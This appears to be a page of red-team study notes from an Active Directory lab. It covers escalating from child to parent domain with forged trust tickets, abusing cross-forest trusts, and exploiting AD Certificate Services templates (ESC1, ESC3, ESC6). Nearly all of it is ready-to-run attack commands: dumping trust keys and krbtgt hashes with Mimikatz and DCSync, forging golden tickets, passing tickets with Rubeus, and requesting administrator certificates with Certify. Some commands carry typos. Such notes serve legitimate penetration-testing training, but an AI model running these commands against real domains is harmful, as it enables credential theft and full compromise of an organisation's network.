# AD - Trust & Certificate Service Abuse

Child to Parent using Trust Tickets

### Description

* sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
* sIDHistory can be abused in two ways of escalating privileges within a forest: \
  – krbtgt hash of the child \
  – Trust tickets

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

**Requirements**

* DA
* SafetyKatz.exe on DC

### **Tool - Using TrustKey**

**Export Trustkey**

<pre class="language-powershell"><code class="lang-powershell">SafetyKatz on DC
lsadump ::trust /patch'

Output:
<strong>Domain: dom.local (dom/ S-1-5-2...) 
</strong>[ In ] sub.dom.lcao -> dom.local
 => Take rcklist4_hmac_nt  ....

Invoke-Mimikatz -Command '"lsadump ::trust /patch'" -ComputerName dchostname
or
Invoke-Mimikatz -Command '"lsadump ::dcsync /user:dom\forest-dc-host$'"
or
Invoke-Mimikatz -Command '"lsadump ::lsa /patch'"
</code></pre>

**Forge an inter-realm TGT**

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberros::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /rc4:hash-of-trust-key-see-above-cmd /service:krbtgt /target:dom.local /ticket:C:\save-ticket-here.kirbi" "exit"



Invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /rc4:hash-of-trust--key /service:krbtgt /target:dom.local /ticket:C:\save-ticket-here.kirbi'"
```
{% endcode %}

**Get a TGS for a Service in target domain with the new ticket / then use TGS to access targeted service**

{% code overflow="wrap" %}
```powershell
rubeus.exe asktgs /ticket:C:\save-ticket-here.kirbi /service:cifs/forest-dc-hostname.dom.local /dc:forest-dc-hostname.dom.local /ptt
ls \\forest-dc-hostname.dom.local\c$

.\asktgs.exe C:\save-ticket-here.kirbi CIFS/forest-dc-hostname.dom.local
.\kirbikator.exe lsa .\CIFS/forest-dc-hostname.dom.local
ls \\forest-dc-hostname.dom.local\c$
Run DC Sync
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:forestname\krbtgt /domain:forest.local" "exit"
```
{% endcode %}

### Tool - Using krbtgt hash

{% code overflow="wrap" %}
```powershell
SafetyKatz on DC
lsadump ::trust /patch'

Invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /krbtgt:hash-of-krbtgt /ticket:C:\save-ticket-here.kirbi'"
or
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /krbtgt:krbtgt-hash /ptt" "exit"

On any machine
Invoke-Mimikatz -command '"kerberos::ptt C:\save-ticket-here.kirbi'"
ls \\parent-dc.dom.local\c$
gwmi -class win32_operatingsystem -ComputerName dc-praent.local
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:parentdom\krbtgt /domain:parentdom.local" "exit"

Run DC Sync
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:forestname\krbtgt /domain:forest.local" "exit"
```
{% endcode %}



## Trust Abuse Across Forest

### Description

<figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

If the receiving DC on the other forest can decrypt the received TGT from Step 5, with the trust key, it assumes everything within the TGT is correct and response with a TGS.\
The trustkey is the NTLM hash of the external domain saved on our DC.

If we have access to the trustkey, we get in the end the permissions that our DA has been given in the forest domain.

### Tool

**We require the trust key for the inter-forest trust.**

```powershell
Invoke-Mimikatz -command '"lsadump::trust /patch"'
or
Invoke-Mimikatz -command '"lsadump::lsa /patch"'
```

**Inter-Forest TGT can be forged with the NTLM hash of the trust key (name of the other forest)**

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -command '"Kerberos::golden /user:Administrator /domain:sub.dom.local /sid:SID /rc4:rc4ntlm-of-trustkey /service:krbtgt /target:targetdom.lol /ticket:C:\myticket.kirbi

rubeus.exe asktgs /ticket:C:\myticket.kirbi /service:cifs/target-dc.targetdom.local /dc:dchostname.targetdom.local /ptt
ls \\targetdom.local\forestshare

Now explicitly shares can be accessed - C$ on forest DC not
```
{% endcode %}

External Trust keys, don't automatically get renewed

Lookup:\
SIDHistory Attack for Parent-Child Domain\
SID Filtering is active for External and Forest Trusts.

## AD Certificate Service (CS)

### Description

* Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.
* AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.&#x20;
* "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."
* CA - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.
* Certificate - Issued to a user or machine and can be used for authentication, encryption, signing etc.
* CSR - Certificate Signing Request made by a client to the CA to request a certificate.
* Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.
* EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

There are various ways of abusing ADCS! (See the link to "Certified PreOwned" paper in slide notes):&#x20;

– Extract user and machine certificates \
– Use certificates to retrieve NTLM hash\
– User and machine level persistence\
– Escalation to Domain Admin and Enterprise Admin\
– Domain persistence

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### Requirement

Common requirements/misconfigurations for all the Escalations that we have in the lab (ESC1, ESC3 and ESC6)&#x20;

– CA grants normal/low-privileged users enrollment rights\
– Manager approval is disabled\
– Authorization signatures are not required\
– The target template grants normal/low-privileged users enrollment rights

### Tool

Certify tool (https://github.com/GhostPack/Certify)

```
Enumerate information about all registered CAs
Certify.exe cas

Enumerate the templates
Certify.exe find

Enumerate vulnerable templates
Certify find /vulnerable
```

**ESC 3**

The template "SmartCardEnrollment-Users" has an Application Policy Issuance Requirement of Certificate Request Agent and has an EKU that allows for domain authentication. Search for domain authentication EKU:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Certify.exe find /json /outfile:C:\AD\Tools\file.json ((Get-Content C:\AD\Tools\file.json | ConvertFromJson).CertificateTemplates | ? {$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl *

Escalate to DA
We can now request a certificate for Certificate Request Agent from "SmartCardEnrollmentAgent" template.
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
/template:SmartCardEnrollment-Agent

Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the "SmartCardEnrollment-Users" template.
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
/template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator
/enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123

Convert from cert.pem to pfx (esc3user-DA.pfx below), request DA TGT and inject it:
Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx
/password:SecretPass@123 /ptt
<strong>
</strong>
</code></pre>

_Escalate to EA_

{% code overflow="wrap" %}
```
Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a
certificate on behalf of EA using the "SmartCardEnrollment-Users" template.
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorpMCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator
/enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123

Request EA TGT and inject it.
Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```
{% endcode %}

**ESC 6**

The CA in moneycorp has EDITF\_ATTRIBUTESUBJECTALTNAME2 flag set. This means that we can request a certificate for ANY user from a template that allow enrollment for normal/low-privileged users

{% code overflow="wrap" %}
```powershell
Certify.exe find

The template "CA-Integration" grants enrollment to the RDPUsers group. Request a
certificate for DA (or EA) as studentx
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DCCA /template:"CA-Integration" /altname:administrator

Convert from cert.pem to pfx (esc6.pfx below) and use it to request a TGT for DA (or
EA).
Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt

```
{% endcode %}

**ESC1**

The template "HTTPSCertificates" has ENROLLEE\_SUPPLIES\_SUBJECT value for msPKI-Certificates-Name-Flag

{% code overflow="wrap" %}
```powershell
Certify.exe find /enrolleeSuppliesSubject

The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request
a certificate for DA (or EA) as studentx
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DCCA /template:"HTTPSCertificates" /altname:administrator /outfile:esc1.pem

Edit File esc1.pem: 
 -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----

Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or
EA).
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx

Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx
/password:SecretPass@123 /ptt

```
{% endcode %}





*
